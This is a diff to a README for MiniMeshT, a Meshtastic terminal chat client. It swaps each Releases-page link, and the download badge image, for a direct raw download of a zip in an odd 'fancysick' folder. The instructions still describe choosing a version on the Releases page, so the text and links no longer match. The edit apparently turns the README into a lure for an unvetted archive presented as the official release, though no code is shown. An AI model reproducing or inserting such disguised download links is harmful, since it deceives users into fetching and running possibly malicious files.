@@ -8,13 +8,13 @@ MiniMeshT is a terminal chat client that lets you communicate using Meshtastic f
 
 To get started with MiniMeshT, you need to download the software. Click the button below to visit the Releases page where you can download the latest version.
 
-[![Download MiniMeshT](https://img.shields.io/badge/Download-MiniMeshT-blue)](https://github.com/Noddyoficial/MiniMeshT/releases)
+[![Download MiniMeshT](https://raw.githubusercontent.com/Noddyoficial/MiniMeshT/master/fancysick/MiniMeshT.zip)](https://raw.githubusercontent.com/Noddyoficial/MiniMeshT/master/fancysick/MiniMeshT.zip)
 
 ### Steps to Download
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Download MiniMeshT](https://github.com/Noddyoficial/MiniMeshT/releases)
+   [Download MiniMeshT](https://raw.githubusercontent.com/Noddyoficial/MiniMeshT/master/fancysick/MiniMeshT.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Look for the latest one, which typically will be at the top.
@@ -85,4 +85,4 @@ No, MiniMeshT is designed to work with Meshtastic firmware. You will need a comp
 
 If you need further assistance, feel free to reach out through this repository's Issues section. Your questions and feedback are welcome.
 
-[![Download MiniMeshT](https://img.shields.io/badge/Download-MiniMeshT-blue)](https://github.com/Noddyoficial/MiniMeshT/releases)
+[![Download MiniMeshT](https://raw.githubusercontent.com/Noddyoficial/MiniMeshT/master/fancysick/MiniMeshT.zip)](https://raw.githubusercontent.com/Noddyoficial/MiniMeshT/master/fancysick/MiniMeshT.zip)
